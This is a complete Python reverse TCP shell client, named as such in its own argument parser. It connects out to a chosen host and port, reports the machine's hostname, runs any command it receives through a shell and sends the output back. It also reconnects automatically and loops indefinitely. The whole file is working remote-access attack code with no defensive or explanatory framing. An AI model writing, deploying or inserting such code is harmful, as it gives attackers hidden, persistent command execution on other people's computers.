import argparse
import os
import socket
import subprocess
import time
import signal
import sys
import struct


class Client(object):

    def __init__(self, host, port):
        self.serverHost = host
        self.serverPort = port
        self.socket = None
        self.connection_retry = 5

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)

    def quit_gracefully(self, signal=None, frame=None):
        print('Quitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % e)
        sys.exit(0)

    def socket_connect(self):
        try:
            self.socket = socket.socket()
            self.socket.connect((self.serverHost, self.serverPort))
            self.socket.send(str.encode(socket.gethostname()))
            print('Connection established')
        except socket.error:
            print('Connection failure')
            time.sleep(self.connection_retry)
            self.socket_connect()

    def print_output(self, output_str):
        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        print(output_str)

    def receive_commands(self):
        while True:
            try:
                self.socket.recv(10)
                cwd = str.encode(str(os.getcwd()) + '> ')
                self.socket.send(struct.pack('>I', len(cwd)) + cwd)
                output_str = None
                data = self.socket.recv(20480)
                if data == b'':
                    break
                elif data[:].decode('utf-8') == 'background':
                    self.socket.close()
                    break
                elif data[:2].decode('utf-8') == 'cd':
                    directory = data[3:].decode('utf-8')
                    os.chdir(directory.strip())
                elif len(data) > 0:
                    cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode('utf-8', errors='replace')
                if output_str is not None:
                    self.print_output(output_str)
            except socket.error:
                self.socket_connect()
            except Exception as e:
                time.sleep(self.connection_retry)
                print(e)
        self.socket.close()


def main():
    parser = argparse.ArgumentParser('A reverse TCP shell')
    parser.add_argument('-H', '--host', required=False, default='0.0.0.0')
    parser.add_argument('-P', '--port', required=False, default=8889)
    args = parser.parse_args()

    client = Client(args.host, args.port)
    while True:
        client.register_signal_handler()
        client.socket_connect()
        client.receive_commands()
        client.socket.close()


if __name__ == '__main__':
    main()
